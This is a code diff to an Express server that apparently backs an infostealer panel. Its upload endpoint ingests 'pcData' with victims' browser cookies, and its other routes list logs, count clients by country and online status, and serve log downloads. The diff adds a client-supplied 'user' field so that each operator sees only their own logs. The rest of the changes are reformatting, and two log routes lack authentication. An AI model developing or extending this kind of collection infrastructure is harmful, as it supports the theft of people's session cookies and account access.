@@ -295,16 +295,10 @@ app.post('/api/auth/reset-password', authenticateToken, (req, res) => {
 app.get('/api/logs', authenticateToken, (req, res) => {
     try {
         const username = req.user.username;
-        let logs = logsDb.getAll();
-        
-        // Only show logs for user "account", hide logs for other users
-        if (username === 'account') {
-            // User "account" sees all logs
-            res.json(logs);
-        } else {
-            // Other users see no logs
-            res.json([]);
-        }
+        // Get logs filtered by the logged-in user
+        // Each log is associated with a user field from the client
+        const logs = logsDb.getAll(username);
+        res.json(logs);
     } catch (error) {
         console.error('Error fetching logs:', error);
         res.status(500).json({ message: 'Internal server error' });
@@ -329,7 +323,7 @@ app.post('/api/upload', (req, res) => {
                 transformedBrowserCookies = JSON.parse(pcData.browserCookies);
             } catch (parseError) {
                 console.error("Error parsing browserCookies string:", parseError);
-                transformedBrowserCookies = [];
+                transformedBrowserCookies = []; 
             }
         } else if (pcData && pcData.browserCookies) {
             transformedBrowserCookies = pcData.browserCookies;
@@ -365,6 +359,9 @@ app.post('/api/upload', (req, res) => {
             delete pcDataToStore.browserCookies;
         }
         
+        // Extract user from pcData
+        const user = pcData?.user || null;
+        
         const logData = {
             id: logId,
             sessionId: sessionId,
@@ -373,6 +370,7 @@ app.post('/api/upload', (req, res) => {
             date: dateTime,
             dataSummary,
             pcData: pcDataToStore,
+            user: user,
         };
 
         // Use createOrUpdate to merge chunks
@@ -397,12 +395,12 @@ app.post('/api/upload', (req, res) => {
 
 app.get('/api/logs/:logId', (req, res) => {
     try {
-        const { logId } = req.params;
+    const { logId } = req.params;
         const log = logsDb.getById(logId);
-        if (log) {
-            res.json(log);
-        } else {
-            res.status(404).send('Log not found');
+    if (log) {
+        res.json(log);
+    } else {
+        res.status(404).send('Log not found');
         }
     } catch (error) {
         console.error('Error fetching log:', error);
@@ -451,8 +449,8 @@ app.get('/api/statistics', (req, res) => {
     console.log('Statistics endpoint hit!');
     try {
         const logs = logsDb.getAll();
-        const totalLogs = logs.length;
-        
+    const totalLogs = logs.length;
+    
         // Calculate country distribution
         const countryCounts = {};
         logs.forEach(log => {
@@ -527,7 +525,7 @@ app.get('/api/statistics', (req, res) => {
 
         const stats = logsDb.getStats();
 
-        res.json({
+    res.json({
             totalLogs,
             allClients: stats.allClients,
             onlineClients: stats.onlineClients,
@@ -551,14 +549,14 @@ app.get('/api/statistics', (req, res) => {
 
 app.get('/api/download/:logId', (req, res) => {
     try {
-        const { logId } = req.params;
+    const { logId } = req.params;
         const log = logsDb.getById(logId);
-        if (log) {
-            res.setHeader('Content-Type', 'application/zip');
-            res.setHeader('Content-Disposition', `attachment; filename=${logId}_data.zip`);
-            res.send(`Dummy ZIP content for log ${logId}`);
-        } else {
-            res.status(404).send('Log not found for download');
+    if (log) {
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', `attachment; filename=${logId}_data.zip`);
+        res.send(`Dummy ZIP content for log ${logId}`);
+    } else {
+        res.status(404).send('Log not found for download');
         }
     } catch (error) {
         console.error('Error downloading log:', error);
